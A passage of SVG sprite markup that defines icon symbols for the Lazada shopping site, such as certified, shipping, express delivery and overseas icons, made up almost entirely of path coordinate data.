59.733333l-59.733334-34.133333C349.866667 375.466667 384 256 384 256l93.866667 25.6s-8.533333 17.066667-25.6 42.666667c366.933333-102.4 384 59.733333 384 59.733333s25.6 119.466667 8.533333 298.666667z"
      fill="#FFFFFF"></path>
  </symbol>
  <symbol id="lazadaicon_certified" viewBox="0 0 1024 1024">
    <path
      d="M512 0c282.766222 0 512 229.233778 512 512s-229.233778 512-512 512S0 794.766222 0 512 229.233778 0 512 0z m255.914667 318.577778l-25.315556-0.455111c-0.568889 0-57.429333-1.251556-116.053333-25.514667-60.188444-24.917333-98.986667-53.475556-99.271111-53.76L511.914667 227.555556l-15.189334 11.292444c-0.369778 0.284444-39.139556 28.842667-99.271111 53.76-58.624 24.291556-115.484444 25.514667-116.024889 25.514667L256 318.577778v263.082666C256 713.671111 422.456889 853.333333 512 853.333333c89.543111 0 256-139.633778 256-271.701333l-0.085333-263.082667zM487.736889 682.666667L341.333333 565.646222l44.999111-49.692444 93.866667 74.979555L658.460444 398.222222 711.111111 441.088 487.708444 682.666667z"
      fill="#06A97F"></path>
  </symbol>
  <symbol id="lazadaicon_liveUp" viewBox="0 0 1024 1024">
    <path
      d="M349.866667 72.533333h324.266666c153.6 0 277.333333 123.733333 277.333334 277.333334v320c0 153.6-123.733333 277.333333-277.333334 277.333333H349.866667c-153.6 0-277.333333-123.733333-277.333334-277.333333V349.866667c0-153.6 123.733333-277.333333 277.333334-277.333334"
      fill="#38C0C6"></path>
    <path
      d="M755.2 422.4l-89.6-89.6c-8.533333-8.533333-17.066667-12.8-29.866667-12.8-8.533333 0-21.333333 4.266667-29.866666 12.8l-89.6 89.6c-17.066667 17.066667-17.066667 42.666667 0 55.466667 17.066667 17.066667 42.666667 17.066667 55.466666 0l21.333334-21.333334v89.6c0 64-34.133333 93.866667-85.333334 93.866667s-85.333333-34.133333-85.333333-98.133333c0-25.6-21.333333-42.666667-42.666667-42.666667-25.6 0-42.666667 17.066667-42.666666 42.666667v4.266666c0 115.2 64 174.933333 170.666666 174.933334s174.933333-59.733333 174.933334-179.2v-85.333334l21.333333 21.333334c17.066667 17.066667 42.666667 17.066667 55.466667 0 12.8-12.8 12.8-38.4-4.266667-55.466667m-379.733333-8.533333c25.6 0 51.2-21.333333 51.2-46.933334 0-25.6-21.333333-46.933333-51.2-46.933333s-51.2 17.066667-51.2 46.933333c0 25.6 25.6 46.933333 51.2 46.933334"
      fill="#FFCD05"></path>
  </symbol>
  <symbol id="lazadaicon_fulfilledbyLazada" viewBox="0 0 1024 1024">
    <path
      d="M911.829333 510.762667c0-221.866667-179.2-401.066667-401.066666-401.066667s-401.066667 179.2-401.066667 401.066667 179.2 401.066667 401.066667 401.066666 401.066667-179.2 401.066666-401.066666m-42.666666 0c0 196.266667-157.866667 354.133333-354.133334 354.133333s-358.4-157.866667-358.4-354.133333 157.866667-354.133333 354.133334-354.133334 358.4 157.866667 358.4 354.133334"
      fill="#00374C"></path>
    <path
      d="M463.829333 369.962667h196.266667v-64h-196.266667v64z m-102.4 349.866666h72.533334v-132.266666h-72.533334v132.266666z"
      fill="#F07025"></path>
    <path d="M438.229333 493.696v-187.733333h-76.8v251.733333h200.533334v-64z" fill="#00374C"></path>
  </symbol>
  <symbol id="lazadaicon_economy" viewBox="0 0 1024 1024">
    <path
      d="M989.866667 529.066667c-132.266667-256-256-273.066667-294.4-273.066667H238.933333c-12.8 0-21.333333 8.533333-21.333333 21.333333v174.933334h42.666667V298.666667h439.466666c4.266667 0 98.133333-4.266667 213.333334 170.666666h-153.6c-34.133333 0-34.133333-29.866667-34.133334-38.4V358.4c0-12.8-8.533333-21.333333-21.333333-21.333333s-21.333333 8.533333-21.333333 21.333333v72.533333c0 29.866667 21.333333 76.8 76.8 76.8h174.933333c4.266667 12.8 12.8 21.333333 21.333333 38.4V640c0 12.8-12.8 25.6-25.6 25.6h-25.6c-8.533333-42.666667-42.666667-68.266667-85.333333-68.266667s-76.8 29.866667-85.333333 68.266667h-238.933334c-8.533333-42.666667-46.933333-68.266667-85.333333-68.266667-42.666667 0-76.8 29.866667-85.333333 68.266667h-38.4c-12.8 0-25.6-12.8-25.6-25.6v-34.133333h34.133333c12.8 0 21.333333-8.533333 21.333333-21.333334s-8.533333-21.333333-21.333333-21.333333H179.2c-12.8 0-21.333333 8.533333-21.333333 21.333333s8.533333 21.333333 21.333333 21.333334h38.4v34.133333c0 38.4 29.866667 68.266667 68.266667 68.266667h29.866666c8.533333 42.666667 42.666667 68.266667 85.333334 68.266666s76.8-29.866667 85.333333-68.266666H725.333333c8.533333 42.666667 42.666667 68.266667 85.333334 68.266666s76.8-29.866667 85.333333-68.266666h25.6c38.4 0 68.266667-29.866667 64-68.266667v-98.133333c8.533333-4.266667 8.533333-8.533333 4.266667-12.8m-174.933334 209.066666c-68.266667 0-68.266667-102.4 0-102.4s68.266667 102.4 0 102.4m-413.866666 0c-68.266667 0-68.266667-102.4 0-102.4s68.266667 102.4 0 102.4m-337.066667-251.733333c-12.8 0-21.333333 8.533333-21.333333 21.333333s8.533333 21.333333 21.333333 21.333334h273.066667c12.8 0 21.333333-8.533333 21.333333-21.333334s-8.533333-21.333333-21.333333-21.333333H64z">
    </path>
  </symbol>
  <symbol id="lazadaicon_standard" viewBox="0 0 1024 1024">
    <path
      d="M601.6 268.8h-68.266667V196.266667h68.266667v72.533333z m332.8 529.066667V128H234.666667c-8.533333 0-12.8 4.266667-21.333334 8.533333-8.533333 8.533333-8.533333 25.6 4.266667 34.133334l230.4 200.533333-162.133333 166.4L170.666667 435.2c-8.533333-8.533333-25.6-8.533333-34.133334 4.266667-8.533333 8.533333-8.533333 25.6 4.266667 34.133333l68.266667 59.733333v273.066667H426.666667l17.066666 34.133333c0 4.266667 12.8 25.6 34.133334 34.133334 4.266667 0 8.533333 4.266667 17.066666 4.266666s17.066667-4.266667 29.866667-8.533333l12.8-4.266667c4.266667 4.266667 12.8 8.533333 17.066667 12.8 4.266667 4.266667 8.533333 4.266667 17.066666 4.266667s21.333333-4.266667 34.133334-8.533333l12.8-4.266667c4.266667 4.266667 12.8 8.533333 17.066666 12.8 4.266667 0 8.533333 4.266667 17.066667 4.266667s21.333333-4.266667 34.133333-8.533334l17.066667-12.8c4.266667 4.266667 8.533333 4.266667 17.066667 8.533334 4.266667 0 8.533333 4.266667 12.8 4.266666 8.533333 0 17.066667-4.266667 29.866666-8.533333 8.533333-4.266667 12.8-17.066667 4.266667-25.6-4.266667-8.533333-17.066667-12.8-29.866667-4.266667l-4.266666 4.266667c-4.266667 0-4.266667-4.266667-4.266667-8.533333l-51.2-106.666667c-4.266667-8.533333-17.066667-17.066667-29.866667-8.533333-8.533333 4.266667-17.066667 17.066667-8.533333 25.6l42.666667 93.866666-17.066667 8.533334c-4.266667 4.266667-8.533333 4.266667-12.8 4.266666-4.266667 0-4.266667-4.266667-8.533333-8.533333l-38.4-85.333333c-8.533333-34.133333-21.333333-38.4-29.866667-34.133334-8.533333 4.266667-17.066667 17.066667-12.8 25.6l29.866667 68.266667-12.8 8.533333c-4.266667 4.266667-12.8 4.266667-17.066667 4.266667-4.266667-4.266667-8.533333-4.266667-8.533333-8.533333l-21.333334-55.466667c-4.266667-8.533333-17.066667-17.066667-29.866666-12.8-8.533333 4.266667-17.066667 17.066667-12.8 25.6l17.066666 38.4-12.8 4.266667c-4.266667 4.266667-8.533333 4.266667-12.8 4.266666-4.266667 0-4.266667-4.266667-4.266666-4.266666l-38.4-81.066667v-4.266667l-72.533334-157.866666-29.866666 29.866666 64 145.066667H256v-179.2l17.066667 17.066667c4.266667 4.266667 8.533333 4.266667 17.066666 4.266666 4.266667 0 12.8-4.266667 17.066667-4.266666l196.266667-200.533334c8.533333-8.533333 4.266667-25.6-4.266667-34.133333L294.4 179.2h187.733333V298.666667h162.133334V179.2h243.2v584.533333h-106.666667l-68.266667-140.8 55.466667 17.066667c4.266667 0 29.866667 4.266667 55.466667-8.533333 8.533333-4.266667 25.6-21.333333 29.866666-46.933334v-4.266666c4.266667-8.533333-4.266667-17.066667-8.533333-21.333334l-196.266667-102.4h-4.266666-4.266667l-110.933333-17.066666-34.133334 29.866666 136.533334 21.333334 179.2 93.866666c-4.266667 4.266667-4.266667 12.8-8.533334 17.066667-4.266667 4.266667-17.066667 4.266667-21.333333 4.266667l-89.6-25.6-8.533333-21.333334c-4.266667-8.533333-17.066667-17.066667-29.866667-8.533333-8.533333 4.266667-17.066667 17.066667-8.533333 25.6l25.6 46.933333 68.266666 140.8 21.333334 34.133334h174.933333z">
    </path>
  </symbol>
  <symbol id="lazadaicon_expressDelivery" viewBox="0 0 1401 1024">
    <path
      d="M877.714286 0l-508.819876 203.52795-184.447205-69.962733c-12.720497-6.360248-25.440994 0-31.801242 6.360249s-12.720497 25.440994-12.720497 31.801242c0 12.720497 12.720497 19.080745 19.080745 25.440994l178.086957 63.602484v279.850932L248.049689 508.819876c-19.080745-6.360248-38.161491 0-44.521739 19.080745-6.360248 19.080745 0 38.161491 19.080746 44.521739l114.484472 44.521739v178.086957l559.701863 228.968944 496.099379-260.770186V190.807453l-515.180124-190.807453z m0 69.962733l407.0559 146.285714-146.285714 76.322982L731.428571 127.204969l146.285715-57.242236z m19.080745 349.813665L464.298137 235.329193 636.024845 165.36646l413.416149 171.726708-152.645963 82.68323z m432.496894 292.571428l-394.335403 209.888199v-445.217391l171.726708-89.043479v159.006211l69.962733-38.16149V356.173913L1335.652174 273.490683v438.857143z m-1081.242236-25.440994c19.080745 6.360248 25.440994 25.440994 19.080746 44.521739-6.360248 19.080745-25.440994 25.440994-44.521739 19.080746l-63.602485-25.440994c-19.080745-6.360248-25.440994-25.440994-19.080745-44.521739 6.360248-19.080745 25.440994-25.440994 44.521739-19.080745l63.602484 25.440993z m0-330.732919c0 12.720497-6.360248 19.080745-12.720496 25.440994-6.360248 6.360248-19.080745 6.360248-31.801243 6.360248l-178.086956-63.602484C12.720497 318.012422 0 305.291925 0 298.931677c0-12.720497 0-25.440994 12.720497-31.801242s19.080745-12.720497 31.801242-6.360249l178.086957 63.602485c19.080745 6.360248 25.440994 19.080745 25.440993 31.801242z m604.223603 120.844721v445.217391l-445.217391-178.086957V292.571429l445.217391 184.447205z">
    </path>
  </symbol>
  <symbol id="lazadaicon_shipping" viewBox="0 0 1024 1024">
    <path
      d="M576 819.2h-341.333333l8.533333-34.133333h307.2l170.666667-588.8h34.133333l-179.2 622.933333zM332.8 196.266667h341.333333l-157.866666 541.866666h-341.333334L332.8 196.266667z m516.266667-51.2H174.933333c-34.133333 0-64 29.866667-64 68.266666v102.4c0 38.4 29.866667 68.266667 64 68.266667h8.533334l12.8-51.2h-21.333334c-8.533333 0-17.066667-8.533333-17.066666-17.066667V213.333333c0-8.533333 8.533333-17.066667 17.066666-17.066666h106.666667l-170.666667 588.8h85.333334l-25.6 85.333333h443.733333L810.666667 196.266667h42.666666c8.533333 0 17.066667 8.533333 17.066667 17.066666v102.4c0 8.533333-8.533333 17.066667-17.066667 17.066667h-42.666666L797.866667 384h51.2c34.133333 0 64-29.866667 64-68.266667V213.333333c0-38.4-29.866667-68.266667-64-68.266666zM362.666667 588.8l8.533333-29.866667h-4.266667c-25.6-4.266667-46.933333-17.066667-59.733333-34.133333-4.266667-4.266667-4.266667-8.533333-4.266667-12.8l42.666667-12.8c4.266667 4.266667 17.066667 12.8 38.4 12.8h4.266667l21.333333-64h-4.266667c-25.6-4.266667-42.666667-12.8-55.466666-21.333333 0 0-4.266667 0-4.266667-4.266667 0 0 0-4.266667-4.266667-4.266667-12.8-4.266667-17.066667-21.333333-12.8-34.133333 12.8-42.666667 68.266667-59.733333 110.933334-64h4.266666l8.533334-29.866667h38.4l-8.533334 29.866667h4.266667c29.866667 4.266667 55.466667 17.066667 64 34.133333 4.266667 4.266667 4.266667 8.533333 4.266667 12.8l-38.4 12.8c-4.266667-4.266667-21.333333-12.8-42.666667-17.066666H469.333333l-21.333333 64h4.266667c34.133333 4.266667 55.466667 17.066667 59.733333 21.333333l4.266667 4.266667v4.266666c8.533333 12.8 12.8 25.6 8.533333 42.666667-12.8 38.4-68.266667 59.733333-115.2 64h-4.266667l-8.533333 25.6h-34.133333z m59.733333-221.866667c-34.133333 4.266667-51.2 17.066667-55.466667 29.866667 0 8.533333 17.066667 17.066667 42.666667 21.333333h4.266667l12.8-55.466666-4.266667 4.266666z m0 149.333334h4.266667c34.133333-4.266667 59.733333-21.333333 59.733333-34.133334 0-8.533333-21.333333-17.066667-46.933333-21.333333h-4.266667l-12.8 55.466667z">
    </path>
  </symbol>
  <symbol id="lazadaicon_noshipping" viewBox="0 0 1024 1024">
    <path
      d="M430.933333 401.066667c-25.6-4.266667-42.666667-12.8-42.666666-21.333334 4.266667-8.533333 21.333333-25.6 55.466666-29.866666h4.266667l-17.066667 51.2z m59.733334-55.466667c21.333333 0 34.133333 8.533333 42.666666 12.8l29.866667-25.6c-12.8-17.066667-29.866667-25.6-55.466667-29.866667h-4.266666l8.533333-29.866666h-42.666667l-8.533333 29.866666h-4.266667c-42.666667 4.266667-98.133333 25.6-110.933333 64-4.266667 12.8 0 29.866667 8.533333 42.666667 0 0 0 4.266667 4.266667 4.266667 0 0 4.266667 0 4.266667 4.266666 8.533333 8.533333 29.866667 12.8 55.466666 21.333334h4.266667l-8.533333 21.333333 59.733333-51.2 17.066667-64z m-170.666667 153.6c0 4.266667 4.266667 8.533333 4.266667 12.8 4.266667 4.266667 12.8 8.533333 17.066666 12.8l34.133334-29.866667c-8.533333 0-12.8-4.266667-12.8-4.266666l-42.666667 8.533333z m89.6 221.866667l-55.466667 51.2h217.6l76.8-260.266667-68.266666 59.733333-42.666667 149.333334h-128zM192 366.933333h8.533333L213.333333 315.733333h-21.333333c-8.533333 0-17.066667-4.266667-17.066667-17.066666V196.266667c0-8.533333 8.533333-17.066667 17.066667-17.066667H298.666667L149.333333 695.466667l68.266667-59.733334L349.866667 179.2h345.6L682.666667 226.133333 793.6 128H192C157.866667 128 128 157.866667 128 196.266667V298.666667c0 38.4 29.866667 68.266667 64 68.266666M891.733333 298.666667c0 8.533333-8.533333 17.066667-17.066666 17.066666h-4.266667l-46.933333 42.666667-4.266667 8.533333h55.466667c34.133333 0 64-29.866667 64-68.266666V256l-46.933334 42.666667zM597.333333 806.4H315.733333l-55.466666 51.2h375.466666l128-443.733333-68.266666 55.466666-98.133334 337.066667z m285.866667-674.133333L128 793.6l38.4 42.666667L921.6 174.933333l-38.4-42.666666z">
    </path>
  </symbol>
  <symbol id="lazadaicon_oversea" viewBox="0 0 1024 1024">
    <path
      d="M985.6 337.066667c-4.266667 12.8-12.8 29.866667-34.133333 38.4l-320 132.266666s-29.866667 8.533333-55.466667 8.533334c-21.333333 0-38.4-8.533333-51.2-17.066667L443.733333 426.666667c-4.266667-4.266667-4.266667-8.533333-4.266666-17.066667s4.266667-12.8 8.533333-17.066667c4.266667 0 17.066667-12.8 42.666667-12.8 8.533333 0 17.066667 0 29.866666 4.266667l42.666667 12.8h12.8c8.533333 0 17.066667-4.266667 29.866667-8.533333l12.8-4.266667-81.066667-68.266667c-4.266667-4.266667-8.533333-12.8-4.266667-21.333333 0-8.533333 4.266667-12.8 12.8-17.066667 4.266667 0 21.333333-8.533333 46.933334-8.533333 17.066667 0 34.133333 4.266667 55.466666 8.533333 42.666667 17.066667 106.666667 42.666667 128 42.666667l102.4-42.666667c4.266667 0 25.6-8.533333 55.466667-8.533333 21.333333 0 38.4 8.533333 51.2 21.333333l4.266667 4.266667c-12.8 0 0 21.333333-4.266667 42.666667z m-42.666667-17.066667c-4.266667-4.266667-12.8-8.533333-17.066666-8.533333-17.066667 0-34.133333 8.533333-34.133334 8.533333l-106.666666 46.933333H768c-34.133333 0-128-34.133333-140.8-46.933333-8.533333-4.266667-17.066667-8.533333-25.6-8.533333l68.266667 59.733333c4.266667 4.266667 8.533333 12.8 4.266666 21.333333 0 8.533333-4.266667 12.8-12.8 17.066667l-51.2 21.333333c-12.8 8.533333-29.866667 8.533333-42.666666 8.533334s-25.6-4.266667-25.6-4.266667l-34.133334-8.533333 46.933334 42.666666c4.266667 8.533333 17.066667 8.533333 25.6 8.533334 17.066667 0 42.666667-8.533333 42.666666-8.533334L938.666667 332.8c4.266667-4.266667 12.8-8.533333 12.8-8.533333-4.266667 0-8.533333-4.266667-8.533334-4.266667z m-268.8-68.266667c-51.2-38.4-110.933333-59.733333-179.2-59.733333-166.4 0-298.666667 136.533333-298.666666 302.933333 0 34.133333 4.266667 68.266667 17.066666 102.4 55.466667-1
